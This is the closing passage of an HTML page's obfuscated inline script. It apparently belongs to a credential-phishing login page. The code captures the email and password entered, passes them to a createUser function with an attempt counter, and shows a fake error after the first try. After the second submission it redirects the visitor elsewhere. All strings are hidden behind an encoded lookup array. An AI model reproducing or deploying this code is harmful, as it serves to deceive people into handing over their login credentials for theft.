                    if (counter == 1) {
                        notifications[_0xe390[50]] = _0xe390[73]
                    } else {
                        notifications[_0xe390[50]] = _0xe390[74]
                    };
                    await createUser(emailInput[_0xe390[62]], passwordInput[_0xe390[62]], counter);
                    counter++;
                    if (counter > 2) {
                        console[_0xe390[16]](_0xe390[75]);
                        secTionE[_0xe390[43]][_0xe390[42]] = _0xe390[57];
                        loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                        notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                        
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(1500);
                        } else {
                            setTimeout(() => {
                                location[_0xe390[77]](_0xe390[76])
                            }, 1500)
                        }
                    } else {
                        error2[_0xe390[43]][_0xe390[42]] = _0xe390[57];
                        document[_0xe390[1]](_0xe390[36])[_0xe390[62]] = _0xe390[17];
                        setTimeout(() => {
                            setTimeout(() => {
                                loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[72];
                                notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[44]
                            }, 500)
                        }, 1000)
                    }
                } else {
                    loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                    notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[72];
                    notifications[_0xe390[50]] = _0xe390[74];
                    setTimeout(() => {
                        loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[72];
                        notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                        error2[_0xe390[43]][_0xe390[42]] = _0xe390[57];
                        document[_0xe390[1]](_0xe390[36])[_0xe390[62]] = _0xe390[17]
                    }, 800)
                }
            } else {
                console[_0xe390[16]](_0xe390[78])
            }
        };
        button[_0xe390[82]](_0xe390[79], () => {
            if (!navigator[_0xe390[80]]) {
                location[_0xe390[81]]()
            } else {
                signin()
            }
        });
        document[_0xe390[1]](_0xe390[36])[_0xe390[82]](_0xe390[83], () => {
            error[_0xe390[43]][_0xe390[42]] = _0xe390[44];
            error2[_0xe390[43]][_0xe390[42]] = _0xe390[44]
        });
        document[_0xe390[1]](_0xe390[36])[_0xe390[82]](_0xe390[84], function(_0x2f74x31) {
            if (_0x2f74x31[_0xe390[85]] === 13) {
                _0x2f74x31[_0xe390[86]]();
                document[_0xe390[1]](_0xe390[3])[_0xe390[79]]()
            }
        });
        document[_0xe390[13]](emailIdNum)[_0xe390[82]](_0xe390[84], function(_0x2f74x31) {
            if (_0x2f74x31[_0xe390[85]] === 13) {
                _0x2f74x31[_0xe390[86]]();
                document[_0xe390[1]](_0xe390[3])[_0xe390[79]]()
            }
        });
    </script>
</body>

</html>